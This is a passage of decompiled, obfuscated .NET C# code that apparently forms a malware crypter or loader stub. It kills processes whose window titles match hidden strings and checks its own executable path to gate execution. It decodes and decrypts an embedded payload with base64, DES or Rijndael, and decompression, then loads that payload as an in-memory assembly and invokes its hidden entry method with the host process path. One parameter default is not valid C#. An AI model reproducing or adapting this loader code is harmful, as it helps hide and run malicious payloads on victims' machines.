	static bool smethod_27(Class7.Class9 class9_0)
	{
		try
		{
			return class9_0.int_0 == class9_0.int_1;
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, class9_0);
			throw;
		}
	}

	static void smethod_28()
	{
		Process[] processes = default(Process[]);
		Process[] array = default(Process[]);
		int i = default(int);
		Process process = default(Process);
		string mainWindowTitle = default(string);
		try
		{
			processes = Process.GetProcesses();
			array = processes;
			for (i = 0; i < array.Length; i = checked(i + 1))
			{
				process = array[i];
				mainWindowTitle = process.MainWindowTitle;
				if (string.Equals(mainWindowTitle, Class6.smethod_0(178319)))
				{
					process.Kill();
				}
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, process, processes, mainWindowTitle, i, array);
			throw;
		}
	}

	static byte[] smethod_29(string string_0)
	{
		try
		{
			return Convert.FromBase64String(Class22.smethod_9(string_0));
		}
		catch (Exception exception_)
		{
			byte[] object_ = default(byte[]);
			Class15.smethod_24(exception_, string_0, object_);
			throw;
		}
	}

	static short smethod_30(int int_0)
	{
		try
		{
			return (short)((Class7.Class13.byte_0[int_0 & 0xF] << 12) | (Class7.Class13.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class7.Class13.byte_0[(int_0 >> 8) & 0xF] << 4) | Class7.Class13.byte_0[int_0 >> 12]);
		}
		catch (Exception exception_)
		{
			Class15.smethod_23(exception_, int_0);
			throw;
		}
	}

	static ICryptoTransform smethod_31(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = default(DESCryptoServiceProvider);
		ICryptoTransform cryptoTransform = default(ICryptoTransform);
		try
		{
			dESCryptoServiceProvider = new DESCryptoServiceProvider();
			try
			{
				cryptoTransform = (bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_0, byte_1) : dESCryptoServiceProvider.CreateEncryptor(byte_0, byte_1));
				return cryptoTransform;
			}
			finally
			{
				((IDisposable)dESCryptoServiceProvider)?.Dispose();
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, bool_0, byte_0, byte_1, dESCryptoServiceProvider, cryptoTransform);
			throw;
		}
	}

	static int smethod_32(Class7.Class9 class9_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		try
		{
			num = 0;
			while (class9_0.int_2 > 0 && int_1 > 0)
			{
				byte_0[int_0++] = (byte)class9_0.uint_0;
				class9_0.uint_0 >>= 8;
				class9_0.int_2 -= 8;
				int_1--;
				num++;
			}
			if (int_1 == 0)
			{
				return num;
			}
			num2 = class9_0.int_1 - class9_0.int_0;
			if (int_1 > num2)
			{
				int_1 = num2;
			}
			Array.Copy(class9_0.byte_0, class9_0.int_0, byte_0, int_0, int_1);
			class9_0.int_0 += int_1;
			if (((uint)(class9_0.int_0 - class9_0.int_1) & (true ? 1u : 0u)) != 0)
			{
				byte[] byte_ = class9_0.byte_0;
				num3 = class9_0.int_0++;
				class9_0.uint_0 = byte_[num3] & 0xFFu;
				class9_0.int_2 = 8;
			}
			return num + int_1;
		}
		catch (Exception exception_)
		{
			Class15.smethod_29(exception_, class9_0, byte_0, int_0, int_1, num, num2, num3);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static bool smethod_33()
	{
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						flag = (Operators.ConditionalCompareObjectEqual(Class2.object_1, (object)Class2.string_2, false) ? true : false);
						goto end_IL_0001;
					case 41:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_005f;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 41;
					continue;
				}
				break;
				IL_005f:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			bool result = flag;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class15.smethod_25(exception_, flag, num2, num);
			throw;
		}
	}

	static Class7.Class11 smethod_34(Class7.Class12 class12_0)
	{
		byte[] array = default(byte[]);
		try
		{
			array = new byte[class12_0.int_3];
			Array.Copy(class12_0.byte_1, 0, array, 0, class12_0.int_3);
			return new Class7.Class11(array);
		}
		catch (Exception exception_)
		{
			Class15.smethod_24(exception_, class12_0, array);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static bool smethod_35()
	{
		int num2 = default(int);
		string startupPath = default(string);
		string text = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						startupPath = Application.get_StartupPath();
						text = startupPath + Class6.smethod_0(178360);
						flag = ((Operators.CompareString(Application.get_ExecutablePath(), text, false) == 0) ? true : false);
						goto end_IL_0001;
					case 61:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_0075;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 61;
					continue;
				}
				break;
				IL_0075:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			bool result = flag;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, flag, startupPath, text, num2, num);
			throw;
		}
	}

	static ICryptoTransform smethod_36(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		SymmetricAlgorithm symmetricAlgorithm = default(SymmetricAlgorithm);
		ICryptoTransform cryptoTransform = default(ICryptoTransform);
		try
		{
			symmetricAlgorithm = new RijndaelManaged();
			try
			{
				cryptoTransform = (bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0));
				return cryptoTransform;
			}
			finally
			{
				((IDisposable)symmetricAlgorithm)?.Dispose();
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, bool_0, byte_0, byte_1, symmetricAlgorithm, cryptoTransform);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static bool smethod_37()
	{
		int num2 = default(int);
		string string_ = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						Class22.smethod_7();
						string_ = Class2.string_0;
						flag = ((Operators.CompareString(string_, Class6.smethod_0(178377), false) == 0) ? true : false);
						goto end_IL_0001;
					case 54:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_006c;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 54;
					continue;
				}
				break;
				IL_006c:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			bool result = flag;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class15.smethod_26(exception_, flag, string_, num2, num);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static bool smethod_38()
	{
		int num2 = default(int);
		string string_ = default(string);
		bool flag = default(bool);
		int num = default(int);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						Class22.smethod_7();
						string_ = Class2.string_0;
						flag = ((Operators.CompareString(string_, Class6.smethod_0(178414), false) == 0) ? true : false);
						goto end_IL_0001;
					case 54:
						num = -1;
						switch (num2)
						{
						case 2:
							ProjectData.EndApp();
							goto end_IL_0001;
						}
						break;
					}
					goto IL_006c;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 54;
					continue;
				}
				break;
				IL_006c:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			bool result = flag;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class15.smethod_26(exception_, flag, string_, num2, num);
			throw;
		}
	}

	static int smethod_39(Class7.Class10 class10_0, Class7.Class9 class9_0, int int_0)
	{
		int num = default(int);
		int num2 = default(int);
		try
		{
			int_0 = Math.Min(Math.Min(int_0, 32768 - class10_0.int_1), Class22.smethod_11(class9_0));
			num = 32768 - class10_0.int_0;
			if (int_0 > num)
			{
				num2 = Class22.smethod_32(class9_0, class10_0.byte_0, class10_0.int_0, num);
				if (num2 == num)
				{
					num2 += Class22.smethod_32(class9_0, class10_0.byte_0, 0, int_0 - num);
				}
			}
			else
			{
				num2 = Class22.smethod_32(class9_0, class10_0.byte_0, class10_0.int_0, int_0);
			}
			class10_0.int_0 = (class10_0.int_0 + num2) & 0x7FFF;
			class10_0.int_1 += num2;
			return num2;
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, class10_0, class9_0, int_0, num2, num);
			throw;
		}
	}

	static Class7.Class11 smethod_40(Class7.Class12 class12_0)
	{
		byte[] array = default(byte[]);
		try
		{
			array = new byte[class12_0.int_4];
			Array.Copy(class12_0.byte_1, class12_0.int_3, array, 0, class12_0.int_4);
			return new Class7.Class11(array);
		}
		catch (Exception exception_)
		{
			Class15.smethod_24(exception_, class12_0, array);
			throw;
		}
	}

	static int smethod_41(Class7.Class9 class9_0, int int_0)
	{
		int num = default(int);
		int num3 = default(int);
		try
		{
			if (class9_0.int_2 < int_0)
			{
				if (class9_0.int_0 == class9_0.int_1)
				{
					return -1;
				}
				uint uint_ = class9_0.uint_0;
				byte[] byte_ = class9_0.byte_0;
				num = class9_0.int_0++;
				int num2 = byte_[num] & 0xFF;
				byte[] byte_2 = class9_0.byte_0;
				num3 = class9_0.int_0++;
				class9_0.uint_0 = uint_ | (uint)((num2 | ((byte_2[num3] & 0xFF) << 8)) << class9_0.int_2);
				class9_0.int_2 += 16;
			}
			return (int)(class9_0.uint_0 & ((1 << int_0) - 1));
		}
		catch (Exception exception_)
		{
			Class15.smethod_26(exception_, class9_0, int_0, num, num3);
			throw;
		}
	}

	static void smethod_42(int int_0, Class7.Class9 class9_0, int int_1, byte[] byte_0)
	{
		int num = default(int);
		try
		{
			if (class9_0.int_0 < class9_0.int_1)
			{
				throw new InvalidOperationException();
			}
			num = int_0 + int_1;
			if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
			{
				if (((uint)int_1 & (true ? 1u : 0u)) != 0)
				{
					class9_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class9_0.int_2);
					class9_0.int_2 += 8;
				}
				class9_0.byte_0 = byte_0;
				class9_0.int_0 = int_0;
				class9_0.int_1 = num;
				return;
			}
			throw new ArgumentOutOfRangeException();
		}
		catch (Exception exception_)
		{
			Class15.smethod_27(exception_, int_0, class9_0, int_1, byte_0, num);
			throw;
		}
	}

	static void smethod_43(string string_0, byte[] byte_0)
	{
		object[] array2 = default(object[]);
		byte[] array3 = default(byte[]);
		object[] array4 = default(object[]);
		string text = default(string);
		string text2 = default(string);
		try
		{
			byte[] array = Class22.smethod_29(Class3.string_0);
			array2 = new object[2] { byte_0, string_0 };
			array3 = array;
			array4 = array2;
			text = Class6.smethod_0(178435);
			text2 = Class6.smethod_0(178440);
			Class22.smethod_45(text, array4, array3, text2);
		}
		catch (Exception exception_)
		{
			Class15.smethod_29(exception_, string_0, byte_0, array2, array3, array4, text, text2);
			throw;
		}
	}

	static void smethod_44(Form0 form0_0)
	{
		string text = default(string);
		byte[] array = default(byte[]);
		try
		{
			text = Conversions.ToString(Class22.smethod_5());
			array = Class22.smethod_21(text, form0_0);
			Class22.smethod_43(Process.GetCurrentProcess().MainModule!.FileName, array);
			form0_0.timer_0.Start();
		}
		catch (Exception exception_)
		{
			Class15.smethod_25(exception_, form0_0, array, text);
			throw;
		}
	}

	static void smethod_45(string string_0, object[] object_0, byte[] byte_0 = "PE", string string_1 = "Run")
	{
		Assembly assembly = default(Assembly);
		Type type = default(Type);
		MethodInfo method = default(MethodInfo);
		try
		{
			try
			{
				assembly = Assembly.Load(byte_0);
				type = assembly.GetType(Class6.smethod_0(178435));
				method = type.GetMethod(Class6.smethod_0(178440));
				method.Invoke(null, object_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception_)
		{
			Class15.smethod_29(exception_, string_0, object_0, byte_0, string_1, type, assembly, method);
			throw;
		}
	}
}
